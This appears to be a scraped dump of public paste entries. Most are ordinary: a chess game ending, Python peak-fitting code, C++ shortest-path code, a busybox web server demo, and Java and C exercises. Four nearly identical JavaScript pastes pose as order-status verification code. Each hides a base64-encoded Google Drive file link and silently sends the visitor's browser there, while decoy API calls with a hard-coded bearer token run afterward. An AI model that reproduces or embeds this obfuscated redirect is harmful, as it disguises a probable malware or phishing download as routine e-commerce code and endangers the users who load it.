4 . . . . . . . . 4
3 . . k . . . . . 3
2 . . . . . q . . 2
1 . K . . . . . . 1
  a b c d e f g h
Move 11: Black plays qf2-b2
  a b c d e f g h
8 . . . . . . . . 8
7 . . . . . . . . 7
6 . . . . . . . . 6
5 . . . . . . . . 5
4 . . . . . . . . 4
3 . . k . . . . . 3
2 . q . . . . . . 2
1 . K . . . . . . 1
  a b c d e f g h
Checkmate! Black wins.

Total analysis time: 227994.4939 seconds"
meyu0Zzf,Untitled,GregLeblanc,Python,Monday 14th of April 2025 11:05:18 AM CDT,"# Define a generic gaussian function
def gauss_lin(x, *params):
    """"""
    This defines a generic gaussiann function plus a linear background, with 
    an arbitrary number of peaks.  Pass the X values and a pointer to your 
    initial guesses.
    Make sure that guesses are in the order of slope, intercept, amplitude, 
    mean, and sigma, and that you have a multiple of 2+3n guesses to pass in.  
    
    Parameters
    ----------
    x : independent variable
    params : parameters for the Gaussian function
        - slope: slope of the linear background
        - intercept: y-intercept of the linear background
        - amplitude: height of the peak
        - mean: position of the center of the peak
        - sigma: width of the peak
        - (repeat for multiple peaks)
    
    Returns
    -------
    y : dependent variable
    """"""
    y = np.zeros_like(x)
    slope = params[0]
    intercept = params[1]
    y += slope * x + intercept
    for i in range(2, len(params), 3):
        amplitude = params[i]
        mean = params[i + 1]
        sigma = params[i + 2]
        y += amplitude * np.exp(-(( x - mean) ** 2) / (2 * sigma ** 2))
    return y
# End of gauss_lin"
VeEhSyrf,Products.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:59:07 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/27903/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4zdLBFiR,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:55:51 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_time, money;
    node () {}
    node(int _idx, int _shortest_time, int _money) {
        idx = _idx;
        shortest_time = _shortest_time;
        money = _money;
    }
    
    bool operator < (const node & tmp) const {
        if(shortest_time == tmp.shortest_time) {
            return money > tmp.money;
        }
        return shortest_time > tmp.shortest_time;
    }
   
};

int main() {
    return 0;
}
"
GaYj8GbN,Webserver with Loopback interface only,metalx1000,Bash,Monday 14th of April 2025 10:49:48 AM CDT,"mkdir www
cd www

# create index web page and start server
echo ""Hello"" > index.html
busybox httpd -vf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888""

# create httpd webserver config file with restrictions
# busybox will look for httpd.conf in current directory
# or you can tell it to look for it in a set place
echo ""A:127.0.0.1"" > httpd.conf
echo 'D:*' >> httpd.conf
busybox httpd -vfc httpd.conf -p8888

# check connection with client
wget -qO- ""http://127.0.0.1:8888""
wget -qO- ""http://localhost:8888""
wget -qO- ""http://192.168.1.158:8888""
brave ""http://127.0.0.1:8888""
brave ""http://localhost:8888""
brave ""http://192.168.1.158:8888"""
8PrkxmnC,Untitled,GregLeblanc,Python,Monday 14th of April 2025 10:46:57 AM CDT,"
    def fit_peaks(self, type, initial_guesses):
        """"""
        Fit the data to a specified function.
        
        Parameters:
        initial_guesses (tuple): Initial guesses for the fit parameters.
        
        Returns:
        tuple: Fitted parameters and covariance matrix.
        """"""
        parameters = getattr(self, f""{type}_parameters"")
        x = getattr(self, f""{type}_channel"")
        y = getattr(self, f""{type}_counts"")
          
        # Fit the data to the specified function
        popt, pcov = curve_fit(gauss_lin, 
                               x, 
                               y,
                               p0=initial_guesses)
        # print(f""Linear background is: y= {popt[0]:.2f}x + {popt[1]:.2f}"")
        
        parameters = popt

        peak_amplitude = getattr(self, f""{type}_peak_amplitude"")
        peak_mean = getattr(self, f""{type}_peak_mean"")
        peak_sigma = getattr(self, f""{type}_peak_sigma"")

        for i in range(2, len(popt), 3):
            peak_amplitude.append(popt[i])
            peak_mean.append(popt[i + 1])
            peak_sigma.append(popt[i + 2])"
r0rLP0LG,Order.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:43:46 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37324/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fMvh2rUj,Untitled,Josif_tepe,C++,Monday 14th of April 2025 10:39:10 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
struct node {
    int idx, shortest_path;
    node() {}
    node(int _idx, int _shortest_path) {
        idx = _idx;
        shortest_path = _shortest_path;
    }
    
    bool operator < (const node & tmp) const {
        return shortest_path > tmp.shortest_path;
    }
};

int main() {
    int n, V;
    cin >> n >> V;
    
    vector<int> portals(n);
    for(int i = 0; i < n; i++) {
        cin >> portals[i];
    }
    priority_queue<node> pq;
    pq.push(node(0, 0));
    vector<bool> visited(n, false);
    vector<bool> portal_visited(11, false);
    
    while(!pq.empty()) {
        node current_node = pq.top();
        pq.pop();
        
        if(current_node.idx == n - 1) {
            cout << current_node.shortest_path << endl;
            return 0;
        }
        if(visited[current_node.idx]) {
            continue;
        }
        visited[current_node.idx] = true;
        
        if(current_node.idx + 1 < n) {
            pq.push(node(current_node.idx + 1, current_node.shortest_path + 1));
        }
        if(current_node.idx - 1 >= 0) {
            pq.push(node(current_node.idx - 1, current_node.shortest_path + 1));
        }
        
        if(!portal_visited[portals[current_node.idx]]) {
            for(int i = 0; i < n; i++) {
                if(portals[i] == portals[current_node.idx]) {
                    pq.push(node(i, current_node.shortest_path + V));
                }
            }
            portal_visited[portals[current_node.idx]] = true;
        }
    }
    
    return 0;
}
"
ghFepZyk,[NP] Risk,dzocesrce,Java,Monday 14th of April 2025 10:34:19 AM CDT,"import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Collections;
import java.util.List;
import java.util.stream.Collectors;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.List;
import java.util.stream.Collectors;

class Round {
    private List<Integer> player1;
    private List<Integer> player2;

    public Round(List<Integer> player1, List<Integer> player2) {
        this.player1 = player1;
        this.player2 = player2;
    }

    public List<Integer> getPlayer1() {
        return player1;
    }

    public List<Integer> getPlayer2() {
        return player2;
    }

    public int player1Victorious(){
        for(int i=0;i<3;i++){
            if(player1.get(i)<=player2.get(i))
                return 0;
        }
        return 1;
    }

    public static Round create(String s) {
        String[] parts= s.split("";"");
        List<Integer> player1= new ArrayList<>();
        String[] player1_dices = parts[0].split(""\\s+"");
        for(int i=0;i<3;i++)
            player1.add(Integer.parseInt(player1_dices[i]));
        List<Integer> player2= new ArrayList<>();
        String[] player2_dices = parts[1].split(""\\s+"");
        for(int i=0;i<3;i++)
            player2.add(Integer.parseInt(player2_dices[i]));

        player1= player1.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        player2= player2.stream().sorted(Comparator.reverseOrder()).collect(Collectors.toList());
        return new Round(player1,player2);
    }

}


class Risk {
    private List<Round> rounds;

    public int processAttacksData(InputStream in) {
        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(in));
        this.rounds= bufferedReader.lines().map(i->Round.create(i)).collect(Collectors.toList());

        return rounds.stream().mapToInt(i->i.player1Victorious()).sum();
    }
    
}


public class RiskTester {
    public static void main(String[] args) {

        Risk risk = new Risk();

        System.out.println(risk.processAttacksData(System.in));

    }
}"
xG18FxVn,14-4-25 ordenarVector,Aluneth,C,Monday 14th of April 2025 10:31:21 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

void cargarVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        v1[i] = rand() % 10;

    }

}

void imprimirVector(int v1[10])
{

    for (int i = 0; i<10; i++)
    {
        printf(""%d - "", v1[i]);

    }

}

void menor(int v1[10])
{
    int menor = v1[0];
    int seRepite = 0;
    for (int i = 0; i<10-1; i++)
    {

        if (menor == v1[i+1])
        {
            seRepite = 1;
        }

        if (menor>=v1[i+1])
        {
            menor = v1[i+1];
        }
    }
    printf(""El menor es: %d"", menor);
    if (seRepite != 0)
    {
        printf(""\nSe repite el menor"");

    }
}

int main()
{
    srand(time(NULL));
    int vector1[10];
    cargarVector(vector1);
    imprimirVector(vector1);
    menor(vector1);


    // printf(""Hello world!\n"");
    return 0;
}
"
deLxZbY2,Market.js,hubertzoo90,JavaScript,Monday 14th of April 2025 10:28:23 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50023/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mi6kRUFN,Untitled,hubertzoo90,JavaScript,Monday 14th of April 2025 10:13:01 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01163/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
